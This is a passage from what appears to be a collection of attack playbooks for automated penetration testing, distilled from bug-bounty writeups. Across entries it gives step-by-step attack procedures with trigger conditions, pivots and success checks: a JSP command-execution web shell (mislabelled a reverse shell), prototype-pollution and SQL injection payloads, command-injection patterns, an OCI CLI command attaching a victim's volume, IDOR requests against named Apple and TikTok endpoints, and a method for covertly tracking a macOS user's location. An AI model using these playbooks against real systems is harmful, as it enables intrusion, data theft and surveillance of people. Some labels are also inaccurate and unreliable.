Arbitrary code execution or retrieval of sensitive information from internal network resources.
Successful cache poisoning leading to persistent XSS for other users.
failure_indicators: 400 Bad Request or 404 Not Found responses for crafted `/_next/image` requests indicate input validation is in place.
No JavaScript execution or SSRF callback suggests the vulnerability has been patched or is not present.
WAF blocks the request or flags it as malicious.

playbooks.impact: An attacker can achieve persistent Cross-Site Scripting (XSS) on any website using the vulnerable library, allowing them to steal session cookies, perform actions on behalf of users, or deface the website. Full-response Server-Side Request Forgery (SSRF) can also be achieved, enabling attackers to access internal network resources, scan internal services, or interact with sensitive endpoints.
playbooks.key_lesson: Always scrutinize image optimization and static asset handling services for vulnerabilities related to host header parsing, protocol enforcement, and reliance on potentially vulnerable third-party libraries, as these can expose significant attack surfaces.

meta.title: TypeORM Prototype Pollution Leading To SQL Injection

tech_stack_fingerprints: Usage of TypeORM in the backend

trigger_conditions.when_to_apply: When a TypeORM entity uses a custom `toPlain` method that does not properly sanitize or validate input, making it vulnerable to prototype pollution.
prerequisites: Target application uses TypeORM
An entity with a `toPlain` method that processes user-controlled input for object serialization.
applicability_signals: Analysis of TypeORM entity code reveals a `toPlain` method that directly uses `Object.assign` or similar methods to merge user input into an object without proper sanitization.
Presence of user-controlled data being processed by a `toPlain` method.
skip_if: All TypeORM entities lack custom `toPlain` methods.
All `toPlain` methods implement robust input validation and sanitization.
The application does not use TypeORM.

recon_steps: Step 1: Analyze the source code of the application to identify TypeORM entities, particularly those with custom `toPlain` methods.
Step 2: Examine the `toPlain` methods for direct usage of `Object.assign` or similar functions that merge user-controlled input into an object without sanitization.
attack_steps: Step 1: Craft a malicious payload designed to exploit prototype pollution. This typically involves injecting properties like `__proto__` or `constructor.prototype` into the serialized object.
Step 2: Send a request to an endpoint that processes the vulnerable entity's serialized data, including the crafted payload.

Step 3: If the prototype pollution is successful, observe changes in the application's behavior or data that indicate the exploit has taken effect, such as unexpected data access or modification due to the altered prototype.

Step 4: If the prototype pollution leads to a state where sensitive data can be leaked or modified, attempt to trigger an SQL injection by manipulating the polluted prototype to inject malicious SQL commands.
payloads_or_patterns: Example of a prototype pollution payload to be embedded in a serialized object: `{'__proto__': {'isAdmin': true}}` or `{'constructor': {'prototype': {'isAdmin': true}}}`.

After successful prototype pollution, craft an SQL injection payload targeting a vulnerable database interaction. The specific SQL injection payload will depend on the context and the affected query. For example: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --`
tools_recommended: Source code analysis tools (e.g., IDE plugins, static analysis tools).
Burp Suite or OWASP ZAP for intercepting and modifying HTTP requests.
Custom scripts for sending crafted payloads and analyzing responses.
success_indicators: The application exhibits unexpected behavior, such as gaining administrative privileges (e.g., `isAdmin` flag being set to true).
Leaked sensitive data from the database.
Successful execution of arbitrary SQL queries, indicated by altered data or error messages that reveal SQL syntax.
The `toPlain` method's output contains unexpected properties or values that were injected via the prototype pollution.
failure_indicators: The prototype pollution payload is rejected or sanitized, resulting in no change to the object's prototype.
The application does not show any signs of modified behavior or data access after sending the payload.
HTTP responses indicate errors or malformed requests without any exploitation indicators.
If the prototype pollution is successful but does not lead to a state where SQL injection is possible, the focus should shift to other potential impacts of the prototype pollution itself (e.g., DoS).

playbooks.impact: Allows an attacker to gain administrative privileges, bypass authorization checks, or execute arbitrary SQL queries, leading to data theft, data manipulation, or denial of service.
playbooks.key_lesson: Always sanitize and validate all user-controlled input, especially when it is used for object serialization or merging, to prevent prototype pollution vulnerabilities.

meta.title: Securing Developer Tools: OneDev Remote Code Execution

trigger_conditions.when_to_apply: When an authenticated user can upload files. The vulnerability is triggered when the uploaded file is processed by the application.
prerequisites: authenticated user session
applicability_signals: endpoint that accepts file uploads, presence of file processing logic in backend
skip_if: file upload is disabled or strictly validated for content type and extension.

recon_steps: Identify endpoints related to file uploads, typically via proxy analysis or source code review.
Analyze the application's behavior when various file types are uploaded to understand processing mechanisms.
attack_steps: Step 1: Upload a crafted file (e.g., a JSP file containing a reverse shell payload) to an endpoint that accepts file uploads.
Step 2: Trigger the processing of the uploaded file. This may involve navigating to a specific URL, performing an action that uses the file, or waiting for a scheduled job.
Step 3: If the payload executes successfully, establish a connection to the attacker-controlled server (e.g., a listener set up on an attacker machine).
payloads_or_patterns: <% out.println("hello"); %> (for initial testing of JSP execution)

<%@ page import="java.io.*" %> <%@ page import="java.util.*" %> Reverse Shell JSP <% String cmd = request.getParameter("cmd"); String[] cmds = cmd.split(" "); StringBuilder sb = new StringBuilder(); try { Process process = Runtime.getRuntime().exec(cmds); BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line = input.readLine()) != null) { sb.append(line + "\n"); } out.println("
" + sb.toString() + "
"); } catch (Exception e) { sb.append(e.getMessage()); } %>
tools_recommended: Burp Suite: To intercept and modify file upload requests, and to identify upload endpoints.
Netcat: To set up a listener for reverse shell connections.
success_indicators: The crafted JSP file executes on the server, and a response is received containing the output of the executed command (e.g., 'hello' for the initial test, or command output for the reverse shell).
A reverse shell connection is established to the attacker's listener.
failure_indicators: File upload fails with a 4xx or 5xx error code.
Uploaded file is not executed, or an error message related to file type or content is returned.
No reverse shell connection is established after attempting to trigger the payload.

playbooks.impact: Remote Code Execution (RCE) on the OneDev server, allowing an attacker to run arbitrary commands with the privileges of the OneDev process.
playbooks.key_lesson: Always validate and sanitize uploaded files, especially in web applications that process user-supplied content, to prevent RCE vulnerabilities. Test file upload functionality with crafted payloads that leverage known server-side scripting languages.

meta.title: Apollo Router Security Audit Report (Q2 2022)

trigger_conditions.when_to_apply: When a GraphQL endpoint is exposed and processing untrusted queries.
prerequisites: Target is running Apollo Router and exposes a GraphQL endpoint.
applicability_signals: A GraphQL endpoint is identified.
Ability to send POST requests to the GraphQL endpoint with a JSON body containing a 'query' field.
skip_if: Target has strong input validation or rate limiting that prevents sending excessively large or complex queries.

recon_steps: Identify GraphQL endpoints exposed by the target application.
attack_steps: Step 1: Send a POST request to the identified GraphQL endpoint with a deliberately complex and deeply nested GraphQL query.
Step 2: Monitor the response time and resource utilization of the Apollo Router instance.
Step 3: If the router becomes unresponsive or resource utilization spikes, a DoS condition is met.
tools_recommended: curl for sending crafted requests.
An HTTP proxy like Burp Suite to intercept and modify requests.
System monitoring tools (e.g., htop, Prometheus, Grafana) to observe resource utilization.
success_indicators: The Apollo Router becomes unresponsive, returning HTTP 5xx errors or failing to respond within a reasonable timeout.
Significant increase in CPU or memory usage on the Apollo Router instance.
failure_indicators: The router handles the complex query without performance degradation and returns a valid GraphQL response (e.g., a query complexity error or a delayed but successful response). In this case, the query complexity might be too low or the router has effective rate limiting/DoS protection.

playbooks.impact: The Apollo Router can become unresponsive, leading to a denial of service for legitimate users of the GraphQL API. This can disrupt application functionality and availability.
playbooks.key_lesson: Always test GraphQL endpoints for denial-of-service vulnerabilities by sending excessively complex or deeply nested queries to check for resource exhaustion.

meta.title: AttachMe: critical OCI vulnerability allows unauthorized access to customer cloud storage volumes

target_profile.required_access_level: any_authenticated_user (with knowledge of victim's volume OCID)
tech_stack_fingerprints: Oracle Cloud Infrastructure (OCI) specific resource identifiers (OCID)

trigger_conditions.when_to_apply: When an attacker can discover the Oracle Cloud Identifier (OCID) of a target victim's OCI storage volume (block or boot), and can provision compute instances within the same Availability Domain (AD) as the target volume.
prerequisites: Attacker has an OCI account.
Attacker can discover the OCID of a victim's storage volume (via web search, low-privilege user enumeration, etc.).
Attacker can provision a compute instance in the same Availability Domain (AD) as the victim's volume.
applicability_signals: Existence of OCI storage volumes (block or boot) with obtainable OCIDs.
OCI tenancy allows attaching volumes to compute instances without explicit cross-tenant authorization checks.
Target volume is unattached or allows multi-attachment.
skip_if: OCI WAF or security controls prevent provisioning compute instances in specific Availability Domains.
Victim's storage volumes are encrypted with keys not accessible by the attacker's OCI tenant.
All storage volumes require explicit cross-tenant IAM policies for attachment.

recon_steps: Step 1: Identify target OCI storage volumes (block or boot) and retrieve their Oracle Cloud Identifiers (OCIDs). This may involve searching public OCI resources, exploiting other vulnerabilities to enumerate OCIDs, or using low-privileged credentials within a victim's environment to list volumes.
Step 2: Determine the Availability Domain (AD) of the target victim's storage volume.
attack_steps: Step 1: Provision a compute instance within the attacker's OCI tenant in the same Availability Domain (AD) where the target victim's storage volume resides.
Step 2: Initiate an attachment operation for the victim's storage volume to the attacker's provisioned compute instance using the victim's volume OCID.
Step 3: If the attachment is successful, the attacker's compute instance will have read/write privileges to the victim's storage volume.
Step 4: Perform actions on the attached volume such as exfiltrating data, searching for secrets, or modifying files to achieve code execution upon mounting by the victim's compute instance.
payloads_or_patterns: OCI CLI command to attach a volume: `oci compute volume-attachment attach --instance-id <ATTACKER_COMPUTE_INSTANCE_OCID> --volume-id <VICTIM_VOLUME_OCID> --is-read-only false` (note: `is-read-only false` implies write access)
tools_recommended: OCI CLI (for provisioning compute instances and attaching volumes)
A method for discovering victim volume OCIDs (e.g., scripting, fuzzing, other exploits)
success_indicators: Successful attachment of the victim's volume to the attacker's compute instance.
Ability to read data from the victim's volume (e.g., listing files, retrieving sensitive content).
Ability to write data to the victim's volume (e.g., creating, modifying, or deleting files).
failure_indicators: Attachment operation fails with an authorization error (e.g., 403 Forbidden).
Compute instance cannot be provisioned in the target Availability Domain.
Volume attachment requires specific IAM policies not met by the attacker's tenant.
If attachment fails, pivot to checking for multi-attachment vulnerabilities or other cross-tenant access vectors.

playbooks.impact: Unauthorized read and write access to any OCI customer's unattached or multi-attachable storage volumes (block and boot). This allows for sensitive data exfiltration, discovery of cleartext secrets, lateral movement, privilege escalation, and potential code execution by modifying executables or boot volumes.
playbooks.key_lesson: Verify that cloud infrastructure services enforcing isolation correctly validate authorization for resource attachment and access across different tenants, especially when using resource identifiers like OCIDs.

meta.title: 7,500$ – IDOR on Apple [consultants.apple.com]

trigger_conditions.when_to_apply: When an authenticated user can interact with application data that appears to be uniquely identified by a numeric ID in the URL.
prerequisites: Attacker has at least two authenticated accounts on the target application.
applicability_signals: Endpoints containing numeric IDs in the URL path or query parameters, such as '/publicLocator/applicationAcnForm?lang=us'.
skip_if: Application consistently returns 403 Forbidden or other authorization errors when attempting to access or modify data associated with another user's account, even after changing the ID.

recon_steps: Step 1: Perform basic recon on consultants.apple.com, focusing on functionalities that allow user data interaction.
Step 2: Identify endpoints within the application that include numeric identifiers in their URLs, e.g., 'consultants.apple.com/publicLocator/applicationAcnForm?lang=us'.
attack_steps: Step 1: Register and authenticate with two separate accounts (Account A and Account B).
Step 2: Use Account A to perform an action that generates or modifies data, noting the associated numeric ID in the request or response.
Step 3: Intercept the request for Account A and change the numeric ID in the URL to one belonging to Account B.
Step 4: Submit the modified request.
Step 5: Verify if the action performed with Account A's session has affected or accessed data associated with Account B.
payloads_or_patterns: GET <TARGET_URL>/publicLocator/applicationAcnForm?lang=us&id=<OTHER_USER_ID>
POST <TARGET_URL>/publicLocator/deleteApplication with body including "id=<OTHER_USER_ID>"
POST <TARGET_URL>/publicLocator/submitJoinForm with body including "id=<OTHER_USER_ID>"
tools_recommended: Burp Suite: Intercepting proxy to modify HTTP requests, specifically changing numeric IDs in the URL or request body.
success_indicators: Account A's request successfully modifies or deletes data belonging to Account B.
When using Account B to reload its data, observe that it has been altered or deleted due to Account A's actions.
failure_indicators: Requests to modify or delete data with a changed ID result in 403 Forbidden or an error indicating insufficient permissions for the target ID.

The application's behavior does not change, and Account B's data remains unaffected. Pivot: Try enumerating different types of IDs (e.g., sequential, UUIDs) or other parameters that might be vulnerable.

playbooks.impact: An attacker can view, modify, or delete data belonging to other authenticated users on the consultants.apple.com platform, leading to unauthorized data access and manipulation.
playbooks.key_lesson: Always test numeric identifiers in API endpoints and application URLs for IDOR vulnerabilities by substituting them with identifiers belonging to other authenticated users.

meta.title: Tag Myself in Your Favorite TikTok Artist Video [IDOR]

trigger_conditions.when_to_apply: When an authenticated user can tag or untag users in a video, and the API endpoint for this action might not properly validate the ownership of the video being modified.
prerequisites: Attacker must have an authenticated TikTok account.
applicability_signals: API endpoint exists for tagging/untagging users in videos.
The endpoint accepts `aweme_id` (video ID) and `add_uids` or `remove_uids` (user IDs) as parameters in a POST request.
skip_if: API endpoint returns an error (e.g., 403 Forbidden) when attempting to modify tags on videos not owned by the authenticated user, even when the `aweme_id` is changed.

recon_steps: Step 1: Identify API endpoints related to video tagging or user mentions using a proxy like Burp Suite while performing these actions within the TikTok mobile app.
Step 2: Analyze the request/response pairs for the tagging/untagging feature to identify relevant parameters such as `aweme_id`, `add_uids`, and `remove_uids`.
attack_steps: Step 1: Authenticate to the TikTok API with the attacker's session token.

Step 2: Send a POST request to `/tiktok/interaction/mention/tag/update/v1` with parameters including `aweme_id` (attacker's video ID), `add_uids` (attacker's user ID), and `remove_uids` (attacker's user ID).
Step 3: Modify the `aweme_id` parameter to an `aweme_id` belonging to a different user (victim).
Step 4: Observe the response and check the victim's video to confirm if the attacker was able to tag another user on the victim's video.
payloads_or_patterns:
POST /tiktok/interaction/mention/tag/update/v1?residence=ID&... HTTP/2
Host: api22-normal-c-useast2a.tiktokv.com
Cookie: <SESSION_TOKEN>
Content-Type: application/x-www-form-urlencoded

aweme_id=<VICTIM_AWEOME_ID>&add_uids=%5B%3CATTACKER_USER_ID%3E%5D&remove_uids=%5B%3COTHER_USER_ID_TO_REMOVE%3E%5D
tools_recommended: Burp Suite: To intercept, analyze, and modify HTTP requests.
TikTok Mobile App: To discover and interact with the target feature.
success_indicators: The attacker is able to tag a user on a video that does not belong to them. The response from the API does not explicitly reject the request based on video ownership.
Upon checking the victim's video, the attacker sees the tag successfully applied.
failure_indicators: The API returns a 403 Forbidden or similar error indicating insufficient permissions.
The video tagging operation fails without any visible change on the victim's video.
If the `remove_uids` parameter is critical and its absence prevents the IDOR, investigate if manipulating other parameters or the order of operations can bypass this dependency.

playbooks.impact: An attacker can tag any user on any video, potentially causing harassment, impersonation, or spreading misinformation by associating users with content they did not approve.
playbooks.key_lesson: Always test API endpoints that modify user-generated content (like tagging) by attempting to perform these actions on content owned by other users, even if the parameters initially appear to only relate to the action itself and not resource ownership.

meta.title: Turning Your Computer Into a GPS Tracker With Apple Maps

tech_stack_fingerprints: Console application log messages from Maps process

trigger_conditions.when_to_apply: When the Apple Maps application is installed and accessible on a macOS system, and the attacker can trigger the opening of specific URLs.
prerequisites: macOS system with Apple Maps installed
Ability to trick the user into opening a crafted URL or trigger it programmatically.
applicability_signals: Discovery of log messages related to GEOQuickETAResponse when interacting with Maps.
Identification of the maps URL scheme.
skip_if: Apple Maps is not installed on the target system.
The target system does not use macOS.

recon_steps: Step 1: Monitor macOS Console application logs while interacting with Apple Maps to identify sensitive information logged.
Step 2: Investigate Apple Maps URL scheme handling and identify parameters that can be controlled externally.
attack_steps: Step 1: Craft a URL with the 'q' parameter to specify latitude and longitude: `http://maps.apple.com/?q=<latitude>,<longitude>`.
Step 2: Open the crafted URL using `open -a maps 'http://maps.apple.com/?q=<latitude>,<longitude>'` to trigger Apple Maps.
Step 3: Capture stderr output from the Maps process using `open --stderr <log_file_path> -a maps 'http://maps.apple.com/?q=<latitude>,<longitude>'`.
Step 4: Parse the log file to extract the `distance` value related to AUTOMOBILE travel time.

Step 5: Implement a trilateration algorithm using multiple distance measurements from different calculated coordinates to approximate the user's real location. Start by approximating user location by IP address.
Step 6: Iteratively adjust coordinates, measure distances, and refine the estimated location until the exact coordinates are found or a desired accuracy is reached.
payloads_or_patterns: http://maps.apple.com/?q=<latitude>,<longitude>
`open --stderr <log_file_path> -a maps 'http://maps.apple.com/?q=<latitude>,<longitude>'`
Regex to extract distance: `/distance = (\d+);/i`
tools_recommended: macOS Terminal (for 'open' command and script execution)
Ruby (for scripting the attack as demonstrated in the writeup)
Burp Suite Collaborator (for potentially capturing callbacks if other vulnerabilities are chained)
success_indicators: Successful extraction of the `distance` value from the Maps process logs.
The trilateration script converges to accurate latitude and longitude coordinates that match the target's location.
failure_indicators: Maps process does not log distance information: The vulnerability might be patched or not present on the target version.
GEOQuickETAResponse logs do not contain the expected distance information: The specific log message format may have changed.
The `open` command fails or does not trigger the Maps process as expected: URL scheme handling might be restricted.

playbooks.impact: An attacker can determine the precise real-time location of a macOS user without their explicit consent or authorization by triggering the Apple Maps application and analyzing its log output. This can be used for tracking, surveillance, or other privacy-violating activities.
playbooks.key_lesson: Always monitor application log output on desktop and mobile applications, especially when they handle location-sensitive data or process external inputs like URL schemes.

meta.title: How i made the multiple hall of fame in Nokia within 2 minutes

affected_components: Domains within Nokia's vulnerability disclosure program
tech_stack_fingerprints: Presence of domains belonging to Nokia, e.g. *.nokia.com

trigger_conditions.when_to_apply: This technique is applicable to any web domain that does not properly configure security headers to prevent framing, specifically the X-Frame-Options header.
prerequisites: The target domain must be susceptible to being loaded within an iframe.
applicability_signals: SecurityHeaders.com reports the X-Frame-Options header as missing or not set to 'DENY' or 'SAMEORIGIN' for the target domain.
Clickjacker.io successfully loads the target URL.
The target domain loads successfully within an iframe created using a simple HTML file.
skip_if: The target domain explicitly sets X-Frame-Options to 'DENY' or 'SAMEORIGIN'.
WAF or other security controls prevent the target domain from being loaded within an iframe.

recon_steps: Step 1: Use securityheaders.com or clickjacker.io by entering the target domain's URL to check the X-Frame-Options header status.
Step 2: If securityheaders.com or clickjacker.io indicates vulnerability, manually create an HTML file with an iframe pointing to the target domain to confirm it loads.
attack_steps: Step 1: Craft an HTML file containing an iframe that embeds the vulnerable Nokia domain. Adjust iframe dimensions and positioning using CSS to create invisible layers.

Step 2: Overlay a malicious UI element (e.g., a button disguised as something benign) over a critical button on the embedded Nokia domain. The goal is to trick the user into clicking the disguised element, which actually triggers an action on the Nokia domain.
Step 3: Host the crafted HTML file on an attacker-controlled server and provide the link to the victim.
payloads_or_patterns: Website is vulnerable to clickjacking
tools_recommended: Burp Suite Clickbandit: To automate the process of identifying clickable elements and generating the clickjacking payload.
Simple HTML editor: To create the clickjacking proof-of-concept file.
success_indicators: The victim performs an unintended action on the Nokia domain by clicking the disguised element (e.g., submitting a form, deleting data, changing settings).
Successful exploitation leads to a Hall of Fame entry for the researcher.
failure_indicators: The target domain does not load within the iframe, or a security warning is displayed.
The X-Frame-Options header is correctly configured (DENY or SAMEORIGIN), preventing the iframe load.
Clickbait detection mechanisms in the browser or WAF block the attack.

playbooks.impact: An attacker can trick authenticated users into performing unintended actions on Nokia's domains without their knowledge or consent. This could lead to account compromise, data modification, or other malicious activities depending on the sensitive actions available on the framed page.
playbooks.key_lesson: Always check for the presence and correct configuration of the X-Frame-Options or Content-Security-Policy:frame-ancestors headers to prevent clickjacking vulnerabilities.

meta.title: Abusing Broken Link In Fitbit (Google Acquisition) To Collect BugBounty Reports On Behalf Of Google !

affected_components: Official Fitbit website (specifically a Google search result)

trigger_conditions.when_to_apply: When a company acquisition is known, and the acquired company's website has a broken link that was previously used for bug bounty reporting or had a specific redirect associated with it.
prerequisites: Attacker knows about a recent acquisition of a company.
The acquired company has a website where bug bounty information was previously published.
applicability_signals: A Google search for the acquired company's website yields a broken link in the top results.
The broken link, when visited, previously directed to a bug bounty platform or information page.
The acquisition is recent enough that the old links might not have been updated comprehensively across all search engines/caches.
skip_if: All search results for the acquired company's website are functional.
The company has explicitly updated all old links and retired old bug bounty reporting mechanisms.

recon_steps: Step 1: Identify a recently acquired company whose acquisition is publicly known and is part of a bug bounty program of the acquiring company (e.g., GoogleVRP).
Step 2: Perform Google searches for the acquired company's official website and related terms (e.g., "Fitbit bug bounty", "Fitbit security policy").
Step 3: Analyze the search results for any broken links (404 errors or redirects to non-existent pages) that appear on the first page.
Step 4: Investigate the historical context of the broken link. If it previously led to a bug bounty platform or security contact, it's a potential target.
attack_steps: Step 1: Identify a broken link on the acquired company's website that was historically used for bug bounty submissions or security contact.

Step 2: (Hypothetical exploitation) If an attacker could register a similar domain or leverage a service that allows hijacking of such links (e.g., by controlling a domain that previously hosted the target's content or by exploiting a vulnerability in a redirect service), they could redirect users to a malicious page.

Step 3: (As per writeup) The core of the 'attack' described is reporting the broken link to the acquiring company's VRP, as it could lead to users being misdirected to outdated or potentially malicious bug bounty reporting platforms.

Step 4: (Hypothetical exploitation continued) The attacker could potentially create a fake bug bounty submission page on a controlled domain that mimics the old platform and collect reports or credentials from unsuspecting researchers.
payloads_or_patterns: N/A (This is about reporting a broken link, not directly injecting a malicious payload into the target)
tools_recommended: Google Search Engine: For identifying broken links in search results.
Wayback Machine (archive.org): To check historical content of the broken link.
GoogleVRP / Target VRP: To report the finding.
success_indicators: Receiving a triaged and accepted report for the broken link in the acquiring company's VRP.
The acquiring company acknowledges the potential for abuse or misdirection of security researchers.
The broken link is eventually fixed by the target.
failure_indicators: The reported broken link is considered low impact or already handled.
The link leads to a generic error page that doesn't suggest a clear path for abuse.
The company's VRP does not accept reports on broken links or misconfigurations.

playbooks.impact: An attacker could potentially register a domain that was previously associated with the acquired company's bug bounty program or related security contact. This would allow them to intercept security researchers' reports intended for the official program, or even phish researchers for credentials. In this specific case, the impact was framed as the risk of researchers being misdirected, potentially to malicious platforms, leading to compromised reports or credentials.
playbooks.key_lesson: Monitor for broken links on acquired company websites that were historically used for security reporting, as they may lead to misdirection or social engineering opportunities.

meta.title: Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities
meta.authors: Q. Kaiser, M. Kir (ONEKEY Research Lab)

trigger_conditions.when_to_apply: When the target is a NETGEAR router or Orbi WiFi System running a vulnerable version of firmware containing the FunJSQ component.
prerequisites: The FunJSQ component is present in the firmware.
The router is accessible from the attacker's network (LAN or WAN).
applicability_signals: Vulnerable firmware versions listed in the advisory.
Presence of the FunJSQ component in the device's capabilities (e.g., enabled when QoS is active, though this is not a direct signal for testing).
skip_if: Firmware is updated to a fixed version.
FunJSQ component is confirmed to be disabled or not present.

recon_steps: Step 1: Identify target NETGEAR router or Orbi WiFi System model and firmware version.
Step 2: Compare firmware version against the list of vulnerable versions provided in the advisory.
Step 3: Confirm the presence of the FunJSQ component, if possible through network traffic analysis or firmware analysis.
attack_steps: Step 1: Craft an HTTP request targeting the FunJSQ component's vulnerable endpoint (details not fully specified in writeup).
Step 2: Inject OS command into a parameter that is processed by FunJSQ.
Step 3: Observe the router's response for signs of command execution.
payloads_or_patterns: Insufficient detail in writeup: The advisory mentions CVE-2022-40619 as an unauthenticated command injection, but does not provide specific payload examples or vulnerable endpoints.
Generic command injection patterns might be applicable but require further investigation: `&; <command>`, `| <command>`, `$(<command>)`
tools_recommended: Burp Suite: To intercept and modify HTTP requests.
Nmap: For network scanning and identifying router models/versions.
Firmware analysis tools (e.g., Binwalk): To analyze firmware images for the presence of FunJSQ.
success_indicators: Successful execution of a command on the router (e.g., command output in the HTTP response, or observable network behavior change like a reverse shell connection).
failure_indicators: HTTP requests returning errors (e.g., 404, 403, 500) without signs of command execution. This could indicate an incorrect endpoint, malformed payload, or a patch that mitigates the vulnerability.
No observable change in the router's behavior after sending the payload.

playbooks.impact: Remote attackers can execute arbitrary OS commands on the affected NETGEAR routers and Orbi WiFi Systems, leading to a complete compromise of the device. This could be leveraged for denial-of-service, data exfiltration, man-in-the-middle attacks, or pivoting to the internal network.
playbooks.key_lesson: Investigate vulnerabilities in third-party components bundled within firmware, as they can introduce significant risks even if the primary vendor is reputable. Always compare firmware versions against vendor advisories and known CVEs.

meta.title: Attacking the Android kernel using the Qualcomm TrustZone

trigger_conditions.when_to_apply: This technique is applicable when the target device utilizes Qualcomm TrustZone (QSEE) and the attacker can gain access to the /dev/qseecom kernel module, which allows communication between Android user mode and trustlets.
prerequisites: Target device uses Qualcomm chipset with QSEE
Attacker has access to the /dev/qseecom kernel module (e.g., via another exploit that escalates privileges from untrusted_app to a context with /dev/qseecom access).
applicability_signals: Presence of /dev/qseecom device node
Ability to communicate with QSEE trustlets via the established protocol.
ION buffers are used for shared memory communication.
skip_if: Target does not use Qualcomm TrustZone.
Attacker lacks access to /dev/qseecom.
QSEE communication protocol is hardened against pointer overlap vulnerabilities.

recon_steps: Step 1: Identify if the target device has a Qualcomm chipset using device information utilities.
Step 2: Check for the presence of the /dev/qseecom device node to confirm TrustZone (QSEE) communication interface availability.
attack_steps: Step 1: Craft a series of commands to the QSEE communication protocol to allocate and manipulate ION buffers.
Step 2: Exploit the vulnerability by overlapping pointers to shared memory addresses within the communication protocol's input buffer, corrupting memory management data.
Step 3: Craft a single whitelist entry to grant the trustlet access to the entire Android kernel memory.
Step 4: Reverse engineer a relevant trustlet (e.g., Widevine) to identify functionality that can be used for arbitrary data copying (e.g., encrypt/decrypt with the same key).
Step 5: Use the arbitrary read/write primitive to scan kernel memory for kallsyms and parse them to locate desired kernel symbols without hardcoded offsets.
Step 6: Modify critical kernel symbols to achieve full kernel compromise.
payloads_or_patterns: Custom crafted data structures for QSEE communication protocol.
Exploitation logic to trigger pointer overlaps in ION buffer allocation/access.
Trustlet-specific commands for data manipulation.
Kernel symbol scanning and modification scripts.
tools_recommended: Custom C/C++ exploit development framework targeting /dev/qseecom.
Reverse engineering tools (IDA Pro, Ghidra) for trustlet analysis.
Kernel debugging tools (if available) for verifying memory modifications.
success_indicators: Successful arbitrary read/write operations on physical memory addresses.
Kernel panic or crash when incorrect modifications are made, indicating memory corruption.
Successful modification of kernel symbols leading to elevated privileges or system control.
Execution of arbitrary code in kernel space.
failure_indicators: Protocol errors or refusals from /dev/qseecom indicating invalid commands or lack of access (e.g., permission denied).
Segmentation faults within the trustlet or kernel that do not result in controllable arbitrary read/write.
WAF or SELinux preventing access to /dev/qseecom.
If attempts to overlap pointers do not result in memory corruption or whitelist modification.

playbooks.impact: Achieves arbitrary read and write primitives over physical memory addresses within the Android kernel, leading to full kernel compromise. This allows an attacker to bypass security mechanisms, steal sensitive data, or execute arbitrary code with kernel privileges.
